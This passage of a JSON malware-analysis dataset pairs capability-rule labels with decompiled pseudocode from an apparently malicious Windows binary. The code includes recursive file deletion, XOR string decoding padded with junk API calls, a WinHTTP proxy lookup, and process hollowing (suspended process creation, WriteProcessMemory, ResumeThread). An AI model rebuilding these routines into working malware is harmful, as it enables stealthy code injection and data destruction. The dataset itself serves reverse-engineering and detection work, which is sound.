            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040dfbd(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.0040dc34();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.0040dd8a(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "0040e071": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040e071(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t hFindFile;\n    uint var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar8 = 8;\n    var_20h = 0x104;\n    var_30h = fcn.0040dc34();\n    lpString2 = in_ECX;\n    if (var_30h != 0) {\n        lpString2 = var_30h;\n    }\n    var_18h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar2 = (*pcVar6)(8, var_18h * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_14h != 0) {\n            uVar2 = (*pcVar6)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x426a6c3f;\n                hFindFile = 0x426a6c63;\n                var_28h._0_2_ = 0x6951;\n                uVar2 = (*pcVar6)(8, 9);\n                uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_1ch = uVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                    if (iVar4 != 0x434564) {\n                        var_24h = 0x6;\n                        *(iVar8 + uVar3) = *(&hFindFile + iVar8 % 6) ^ (iVar8 + uVar3)[&var_ch - uVar3];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_3ch = 0x6c784a3f;\n                var_38h = 0x5260637f;\n                var_34h._0_2_ = 0x516c;\n                hFindFile = 0x6c524a63;\n                var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x51);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar4 = 0;\n                var_24h = &var_3ch - iVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetInputState)();\n                    iVar1 = var_14h;\n                    if (iVar5 != 0xfe13c1) {\n                        var_24h = 0x5;\n                        *(iVar4 + iVar8) = *(&hFindFile + iVar4 % 5) ^ *((&var_3ch - iVar8) + iVar4 + iVar8);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar8);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar1, lpFindFileData);\n                uVar3 = var_1ch;\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_1ch = iVar4 + 2 + var_18h;\n                            if (var_20h < var_1ch) {\n                                uVar2 = (*pcVar6)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                uVar2 = (*pcVar6)(8, var_1ch * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_18h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar4 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.0040e071(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar4 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar4 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar4 != 0);\n                }\n                uVar2 = (*pcVar6)(0, iVar8);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar6)(0, uVar3);\n                (*pcVar7)(uVar2);\n                uVar2 = (*pcVar6)(0, lpFindFileData);\n                (*pcVar7)(uVar2);\n                iVar8 = var_ch;\n            }\n            uVar2 = (*pcVar6)(0, var_14h);\n            (*pcVar7)(uVar2);\n        }\n        if (lpFileName != 0) {\n            uVar2 = (*pcVar6)(0, lpFileName);\n            (*pcVar7)(uVar2);\n        }\n    }\n    if (var_30h != 0) {\n        uVar2 = (*pcVar6)(0, var_30h);\n        (*pcVar7)(uVar2);\n    }\n    return iVar8;\n}\n",
        "token_count": 1814
    },
    "00402615": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00402615(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.004053db();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 274
    },
    "0040267f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040267f(void)\n\n{\n    int32_t iVar1;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0x278cdf58;\n    iVar1 = 0;\n    var_bch = 0x2d386ece;\n    var_b8h = 0xaba416e3;\n    var_b4h = 0xbffde1f0;\n    var_b0h = 0x6fadb57b;\n    var_ach = 0x581419ac;\n    var_a8h = 0xa93a5da5;\n    var_a4h = 0x9fe09b81;\n    var_a0h = 0x62b621c4;\n    var_9ch = 0xe2f42d3;\n    var_98h = 0x1cb3f267;\n    var_94h = 0x7deed7db;\n    var_90h = 0x487c3558;\n    var_8ch = 0xbc541011;\n    var_88h = 0x70f400cf;\n    var_84h = 0x7e11e4cf;\n    var_80h = 0x52feb192;\n    var_7ch = 0x1e24d477;\n    var_78h = 0x4a6b6ebc;\n    var_74h = 0x6de558e4;\n    var_70h = 0x6e4851f8;\n    var_6ch = 0x9f5462ed;\n    var_68h = 0x896773d7;\n    var_64h = 0x68b0f30d;\n    var_60h = 0x7b8b2670;\n    var_5ch = 0x1e84d9c6;\n    var_58h = 0xf9b64044;\n    var_54h = 0x11e91917;\n    var_50h = 0x7ec953ab;\n    var_4ch = 0xafb3480;\n    var_48h = 0x5d5421cf;\n    var_44h = 0x4055c0a5;\n    var_40h = 0xb4c2ed27;\n    var_3ch = 0x6751a7a7;\n    var_38h = 0xf0fc4f7;\n    var_34h = 0xbf550eed;\n    var_30h = 0x1b54824;\n    var_2ch = 0x72c7bd89;\n    var_28h = 0xb15afa72;\n    var_24h = 0xd35c5e5c;\n    var_20h = 0x86bd8b3a;\n    var_1ch = 0x334b7fa5;\n    var_18h = 0x47e5605f;\n    var_14h = 0xe1e54873;\n    var_10h = 0xd8367b99;\n    do {\n        var_4h = 0;\n        fcn.004053db();\n        if (var_4h != 0) {\n            return 1;\n        }\n        var_8h = (&var_bch)[iVar1];\n        iVar1 = iVar1 + 1;\n    } while (var_8h != 0);\n    return 0;\n}\n",
        "token_count": 1109
    },
    "00402f48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402f48(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040aebd;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41dac8 & 1) != 0)) {\n        var_20h = 0x413000;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.0040b68f(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.0040b3ec(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.0040b868(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41dac8 & 1) != 0)) {\n                iVar3 = fcn.00402c13();\n            }\n            else {\n                iVar3 = fcn.004028c5();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00403110(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.0040b548();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1168
    },
    "00403925": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403925(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t in_EDX;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint unaff_EBX;\n    uchar *puVar13;\n    int32_t *piVar14;\n    uchar *puVar15;\n    int32_t *piStack1016;\n    uchar *puStack1012;\n    uint uStack1008;\n    int32_t *piStack1004;\n    uint uStack1000;\n    uchar *puStack996;\n    uchar *puStack992;\n    uchar *puStack988;\n    uint uStack984;\n    uchar *puStack980;\n    uchar *puStack976;\n    uint uStack972;\n    uint uStack968;\n    uint uStack964;\n    uint uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    int32_t iStack928;\n    uint32_t uStack924;\n    int32_t iStack920;\n    uchar *puStack916;\n    uint8_t auStack912 [2];\n    ushort uStack910;\n    uint uStack908;\n    uchar *puStack904;\n    uint uStack900;\n    uint32_t uStack896;\n    int32_t iStack892;\n    uint uStack888;\n    uint uStack884;\n    uint uStack880;\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    uint uStack860;\n    uint uStack856;\n    uint uStack852;\n    uint uStack848;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack804;\n    uchar auStack740 [88];\n    int32_t iStack652;\n    int32_t iStack636;\n    \n    uStack948 = 0x208;\n    uStack952 = 8;\n    uStack956 = 0x403949;\n    uStack924 = in_EDX;\n    uStack956 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    uStack960 = 0x403952;\n    puStack904 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack900 = 0x343b7061;\n    uStack852 = 0;\n    iStack928 = 0;\n    uStack924 = uStack924 & 0xffffff00;\n    iStack920 = 0;\n    uStack908 = 0;\n    uStack848 = 0;\n    puVar6 = &stack0xfffffcd4;\n    for (iVar11 = 0x44; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uStack812 = 0x44;\n    puVar6 = &stack0xfffffcb8;\n    for (iVar11 = 0x10; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uStack896 = 0x7037331f;\n    iStack892 = 0x3303341c;\n    puVar6 = &stack0xfffffd1c;\n    for (iVar11 = 0x2cc; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uStack960 = 0x5d;\n    uStack888 = 0x343a7029;\n    uStack884 = 0x702b3309;\n    puVar6 = puStack904;\n    for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uStack964 = 8;\n    uStack880 = 0x3343341c;\n    uStack876 = 0x343b7018;\n    uStack872 = 0x7037331f;\n    uStack868 = 0x3303341c;\n    uStack864 = 0x345b7029;\n    uStack860 = 0x70183354;\n    uStack856 = CONCAT22(uStack856._2_2_, 0x3468);\n    puStack916 = 0x34687044;\n    auStack912[0] = 0x66;\n    auStack912[1] = 0x33;\n    uStack968 = 0x403a23;\n    uStack968 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack972 = 0x403a26;\n    puVar6 = (*pcVar5)();\n    iVar11 = 0;\n    uStack856 = puVar6;\n    do {\n        uStack972 = 0x403a3c;\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        puVar13 = puStack916;\n        if (iVar7 != 0x54c5ab) {\n            uStack956 = 6;\n            puVar6[iVar11] = (&stack0xfffffc60)[iVar11 % 6] ^ (puVar6 + iVar11)[&stack0xfffffc70 + -puVar6];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x2e);\n    uStack972 = 0x104;\n    puStack976 = puStack916;\n    uStack984 = 0x403a75;\n    puStack980 = puVar6;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar5 = _sym.imp.KERNEL32.dll_lstrcatW;\n    uStack984 = uStack960;\n    puStack988 = puVar13;\n    puStack992 = 0x403a82;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack992 = 0x4117a0;\n    puStack996 = puVar13;\n    uStack1000 = 0x403a8a;\n    (*pcVar5)();\n    uStack1000 = arg_8h;\n    piStack1004 = puVar13;\n    uStack1008 = 0x403a90;\n    (*pcVar5)();\n    uStack1008 = 0x4117a8;\n    puStack1012 = puVar13;\n    piStack1016 = 0x403a98;\n    (*pcVar5)();\n    pcVar5 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while( true ) {\n        piStack1016 = &stack0xfffffc80;\n        iVar11 = (*pcVar5)(0, puVar13, 0, 0, 0, 0x800000c, 0, 0, &stack0xfffffc9c);\n        if (iVar11 != 0) break;\n        puStack1012 = 0x3e8;\n        piStack1016 = 0x403aab;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    puStack1012 = puVar13;\n    piStack1016 = NULL;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uStack804 = 0x10002;\n    puVar13 = piStack1004 + *(piStack1004 + 0x3c);\n    puStack980 = puVar13;\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(uStack900, &stack0xfffffcdc);\n    if (iVar11 != 0) {\n        piStack1016 = *(puVar13 + 0x50);\n        iVar11 = fcn.0040b68f(&stack0xfffffc2c);\n        if ((iVar11 == 0) && (iVar11 = fcn.0040b3ec(&stack0xfffffc64),  iVar11 == 0)) {\n            puVar15 = puStack992;\n            if (puStack992 != NULL) {\n                for (; piStack1016 != NULL; piStack1016 = piStack1016 + -1) {\n                    *puVar15 = 0;\n                    puVar15 = puVar15 + 1;\n                }\n                puVar6 = puStack1012;\n                puVar15 = puStack992;\n                for (iVar11 = *(puVar13 + 0x54); iVar11 != 0; iVar11 = iVar11 + -1) {\n                    *puVar15 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar15 = puVar15 + 1;\n                }\n                uStack1008 = 0;\n                if (*(puVar13 + 6) != 0) {\n                    piStack1004 = puVar13 + *(puVar13 + 0x14) + 0x24;\n                    do {\n                        iVar11 = piStack1004[1];\n                        if (iVar11 != 0) {\n                            puVar6 = puStack1012 + *piStack1004;\n                            puVar15 = puStack992 + *piStack1004;\n                            for (; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                *puVar15 = *puVar6;\n                                puVar6 = puVar6 + 1;\n                                puVar15 = puVar15 + 1;\n                            }\n                        }\n                        piStack1004 = piStack1004 + 10;\n                        uStack1008 = uStack1008 + 1;\n                    } while (uStack1008 < *(puVar13 + 6));\n                }\n                iVar11 = 0xa0;\n                if (*(puVar13 + 4) == -0x799c) {\n                    iVar11 = 0xb0;\n                }\n                piStack1004 = uStack924 - *(puVar13 + 0x34);\n                uStack896 = uStack924 - *(puVar13 + 0x34);\n                iStack892 = (uStack924 >> 0x1f) - (uStack924 < *(puVar13 + 0x34));\n                piStack1016 = puStack1012 + *(puVar13 + iVar11);\n                if ((*(puVar13 + iVar11) != 0) && (puStack976 = *(puVar13 + iVar11 + 4),  puStack976 != NULL)) {\n                    for (; 0x8 < puStack976; puStack976 = puStack976 + -*piVar14) {\n                        uStack1008 = piStack1016[1] - 8U >> 1;\n                        iVar11 = *piStack1016;\n                        if ((piStack1016[1] <= puStack976) && (uStack1008 != 0)) {\n                            piVar14 = piStack1016 + 2;\n                            uVar12 = uStack1008;\n                            do {\n                                uVar2 = *piVar14;\n                                puStack1012 = uVar2 >> 0xc;\n                                if (puStack1012 == 0x3) {\n                                    *(puStack992 + (uVar2 & 0xfff) + iVar11) =\n                                         piStack1004 + *(puStack992 + (uVar2 & 0xfff) + iVar11);\n                                }\n                                else if (puStack1012 == 0xa) {\n                                    uVar9 = uVar2 & 0xfff;\n                                    puVar1 = puStack992 + uVar9 + iVar11;\n                                    uVar3 = *puVar1;\n                                    *puVar1 = *puVar1 + uStack896;\n                                    *(puStack992 + uVar9 + 4 + iVar11) =\n                                         *(puStack992 + uVar9 + 4 + iVar11) + iStack892 + CARRY4(uVar3, uStack896);\n                                }\n                                piVar14 = piVar14 + 2;\n                                uVar12 = uVar12 - 1;\n                            } while (uVar12 != 0);\n                        }\n                        piVar14 = piStack1016 + 1;\n                        piStack1016 = piStack1016 + piStack1016[1];\n                        puVar13 = puStack988;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar7 = *(puVar13 + 0x28) + iStack928;\n                iVar11 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(puStack916, iStack652 + 8, &stack0xfffffc84, 4, 0);\n                pcVar5 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                puVar6 = puStack916;\n                if (iVar11 != 0) {\n                    iStack920 = 1;\n                    iVar11 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc18, 1);\n                    if (iVar11 == 0) {\n                        uStack1008._0_1_ = 0xe9;\n                    }\n                    uStack1008 = uStack1008 & 0xffffff00 | uStack1008;\n                    iVar10 = (*pcVar5)(&stack0xfffffc11, 4);\n                    iVar11 = iStack928;\n                    if (iVar10 == 0) {\n                        uVar12 = (iVar7 - iStack636) - 5;\n                        piStack1016 = piStack1016 & 0xff | uVar12 * 0x100;\n                        puStack1012 = puStack1012 & 0xffffff00 | uVar12 >> 0x18;\n                    }\n                    iVar7 = 0;\n                    do {\n                        iVar10 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                           (iVar11, iVar7 + iStack652, &stack0xfffffc08 + iVar7, unaff_EBX, 0);\n                        if (iVar10 == 0) break;\n                        iVar7 = iVar7 + 1;\n                    } while (iVar7 < 5);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(uStack924);\n                    puVar6 = puStack916;\n                }\n                goto code_r0x00403d7b;\n            }\n        }\n        else {\ncode_r0x00403d7b:\n            if (puStack992 != NULL) {\n                fcn.0040b548();\n            }\n        }\n        if (puStack980 != NULL) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puStack980);\n        }\n        if (iStack920 != 0) goto code_r0x00403dc2;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(CONCAT22(uStack910, CONCAT11(auStack912[1], auStack912[0])), 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\ncode_r0x00403dc2:\n    uVar4 = CONCAT11(auStack912[1], auStack912[0]);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    return CONCAT22(uStack910, uVar4);\n}\n",
        "token_count": 3468
    },
    "00404514": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404514(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar6 != 0) && (iVar6 = fcn.004044c0(),  iVar6 != 0)) {\n        